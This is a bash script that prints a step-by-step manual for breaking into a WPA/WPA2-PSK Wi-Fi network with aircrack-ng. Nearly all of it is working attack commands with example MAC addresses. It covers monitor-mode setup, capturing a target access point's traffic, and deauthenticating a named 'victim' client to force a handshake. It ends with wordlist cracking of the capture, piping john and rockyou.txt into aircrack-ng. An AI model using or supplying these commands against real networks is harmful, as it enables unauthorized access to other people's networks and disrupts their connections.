#!/bin/bash -
#a simple guide of cracking a wpa(2)-psk AP with aircrack-ng.
#operation can not be automated,so print it as manual.
#using aircrack-ng(1.2 beta1) and so on.
#
#by needle wang
#
#version2: add session command with john.
#2013年 10月 29日 星期二 02:20:21 CST
#
#version1:build it.
#2013年 10月 22日 星期二 00:56:34 CST

LANG=C

echo "-------- A simple guide of cracking wpa(2)-psk, not wep~ --------"
cat <<EOF
#step 1:
#to clone a interface as mon0:
	airmon-ng start wlan0
#and then run airmon-ng to show the wireless interface to check if it works.
	airmon-ng
#if not work, debug it by previous running mesg.

EOF

read -p "[Press Enter:]"

cat <<EOF
#step 2:
#run "airodump-ng mon0" to show all AP detected:
	airodump-ng mon0
#then choose a AP: remember the BSSID(AP's MAC), its channel and ESSID.
#also a victim' MAC associated with the BSSID in STATION column if there are.

EOF

read -p "[Press Enter:]"

cat <<EOF
#step 3:
#run as below, -c channel --bssid AP's MAC -w outputfile mon0(interface).
#make a independent dir and cd in, will be better for later operation, even the future.
#it will capture the handshake.
	airodump-ng -c 7 --bssid C8:3A:35:0E:B8:20 -w ssidfile mon0

EOF

read -p "[Press Enter:]"

cat <<EOF
#step 4: capture a handshake(during a client connecting):
#two situations:
#one: no one surfing on AP~
#waiting for a connection, which is embarrassing without other choise...
#util airodump-ng capture one handshake or more.
#two: if a connection existed~
#use aireplay to make the victim off line. so it would be reconnect to AP.
#like below to cut off connection for a re-handshake,
#option: -0 for deauthentication in wpa/wpa2, set 1-10 (times), -a AP'MAC [-c victim'MAC]
0 (times) means no stop sending, don't use 0, It's unstable like Ddos.
	aireplay-ng -0 2 -a C8:3A:35:0E:B8:20 -c 78:D6:F0:EE:C4:9E mon0

#a handshake will be displayed at top-right in airodump-ng's perspective.
#or you can run aircrack-ng ssidfile-01.cap at intervals to check if a handshake done.

EOF

read -p "final step:
[Press Enter:]"

cat <<EOF
#step 5:
#for password, crack the .cap file which has been renamed with suffix -01.cap, 
#if more traffic are captured, maybe ssidfile-02.cap... would be created.
#use a wordList file to crack the passwd~, which is the only way to wpa(2)-psk in aircrack-ng!
#but where is the wordList, I don't know, but you will make it...
	aircrack-ng -w a_wordList ssidfile-1.cap
#if more than one .cap file, it should be used like ssidfile*.cap.
#warn: there's no way to pause, so you can run as below
#cd the capfile dir is better for the independent session's path
	john -wordlist:/usr/share/wordlists/rockyou.txt -stdout -session:aircrack_pause | aircrack-ng -w - -b C8:3A:35:0E:B8:20 ssidfile-1.cap
later:
	john -restore:aircrack_pause | aircrack-ng -w - -b C8:3A:35:0E:B8:20 ssidfile-1.cap

EOF

read -p "After all, remember cleaning the lab:
[Press Enter:]"

cat <<EOF
airmon-ng stop mon0
EOF
